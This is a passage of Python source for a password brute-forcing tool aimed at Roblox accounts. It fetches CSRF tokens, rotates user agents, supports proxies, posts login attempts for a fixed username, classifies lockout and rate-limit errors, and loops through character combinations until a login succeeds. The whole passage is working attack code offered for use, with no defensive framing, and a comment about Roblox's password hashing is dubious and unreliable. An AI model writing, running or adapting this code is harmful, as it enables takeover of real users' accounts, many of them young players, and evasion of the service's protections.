    def get_csrf_token(self, session):
        """Get CSRF token from Roblox"""
        try:
            response = session.get('https://www.roblox.com/home', headers=self.headers)
            if 'x-csrf-token' in response.headers:
                return response.headers['x-csrf-token']
        except:
            pass
        return ''
    
    def hash_password(self, password):
        """Hash password using Roblox's algorithm"""
        # Roblox uses SHA512 with salt
        hash_obj = hashlib.sha512()
        hash_obj.update(password.encode('utf-8'))
        return hash_obj.hexdigest()
    
    def attempt_login(self, session, password, proxy=None):
        """Attempt to login with given credentials"""
        try:
            # Update headers
            self.headers['User-Agent'] = random.choice(self.user_agents)
            
            # Get CSRF token first
            csrf_token = self.get_csrf_token(session)
            if csrf_token:
                self.headers['X-CSRF-TOKEN'] = csrf_token
            
            # Prepare login data
            login_data = {
                "ctype": "Username",
                "cvalue": self.username,
                "password": password,
                "captchaToken": "",
                "captchaProvider": "PROVIDER_ARKOSE_LABS"
            }
            
            # Set proxy if available
            proxies = None
            if proxy:
                proxies = {'http': proxy, 'https': proxy}
            
            # Make login request
            response = session.post(
                self.login_url,
                json=login_data,
                headers=self.headers,
                proxies=proxies,
                timeout=10
            )
            
            self.attempts += 1
            
            # Check response
            if response.status_code == 200:
                data = response.json()
                if data.get('userId'):
                    return True, data
                elif data.get('errors'):
                    error_msg = data['errors'][0]['message']
                    if 'InvalidCredentials' in error_msg or 'Incorrect username or password' in error_msg:
                        return False, "Wrong password"
                    elif 'AccountLocked' in error_msg or 'Too many attempts' in error_msg:
                        return False, "Account locked"
                    elif 'Captcha' in error_msg:
                        return False, "CAPTCHA required"
            
            elif response.status_code == 403:
                return False, "CSRF token issue"
            elif response.status_code == 429:
                return False, "Rate limited"
                
        except requests.exceptions.RequestException as e:
            return False, f"Connection error: {e}"
        
        return False, "Unknown error"
    
    def brute_force_attack(self, min_length=4, max_length=8, charset=None):
        """Brute force attack with character combinations"""
        if charset is None:
            charset = string.ascii_lowercase + string.digits
        
        print(f"[*] Starting brute force attack (length: {min_length}-{max_length})")
        
        # Generate passwords
        from itertools import product
        
        for length in range(min_length, max_length + 1):
            for combo in product(charset, repeat=length):
                if not self.is_running:
                    break
                    
                password = ''.join(combo)
                
                # Try login
                session = requests.Session()
                success, message = self.attempt_login(session, password)
                
                if success:
                    self.found_password = password
                    return True
                
                # Display progress
                if self.attempts % 100 == 0:
                    elapsed = time.time() - self.start_time
                    rate = self.attempts / elapsed if elapsed > 0 else 0
                    print(f"[*] Attempts: {self.attempts} | Rate: {rate:.1f}/sec | Testing: {password}")
                
                time.sleep(self.delay)
                
                # Check limits
                if self.attempts >= self.max_attempts:
                    print("[!] Max attempts reached")
                    return False
        
        return False
    
